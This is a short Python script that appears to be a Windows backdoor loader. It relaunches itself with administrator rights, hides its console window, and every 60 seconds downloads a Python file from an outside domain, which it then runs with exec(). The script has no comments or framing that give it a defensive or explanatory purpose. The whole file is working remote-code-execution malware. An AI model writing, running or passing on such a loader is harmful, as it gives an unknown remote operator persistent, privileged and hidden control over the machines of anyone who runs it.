import os
import urllib.request
import time
import ctypes
import sys


SERVER_URL = 'https://nikestylesite.pp.ua/files/app.py/'
# Path where the script will be temporarily saved
TEMP_SCRIPT_PATH = 'tmp/temp_script.py'
# File path to the current script being executed
CURRENT_SCRIPT_PATH = os.path.abspath(__file__)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin(script_path):
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script_path, None, 1)

def download_script(url, path):
    try:
        response = urllib.request.urlopen(url)
        with open(path, 'wb') as f:
            f.write(response.read())
    except Exception as e:
        print(f"Error downloading script: {e}")

def is_server_reachable(url):
    try:
        response = urllib.request.urlopen(url, timeout=10)
        return response.status == 200
    except:
        return False

def execute_script(path):
    exec(open(path).read(), globals())

def main():
    if not is_admin():
        script_path = os.path.abspath(__file__)
        run_as_admin(script_path)
        sys.exit()

    while True:
        if is_server_reachable(SERVER_URL):
            download_script(SERVER_URL, TEMP_SCRIPT_PATH)
            if os.path.getmtime(CURRENT_SCRIPT_PATH) != os.path.getmtime(TEMP_SCRIPT_PATH):
                execute_script(TEMP_SCRIPT_PATH)
        time.sleep(60)

# Hide the console window (Windows-specific)
if os.name == 'nt':
    ctypes.windll.kernel32.SetConsoleTitleW("Hidden")
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

if __name__ == "__main__":
    main()
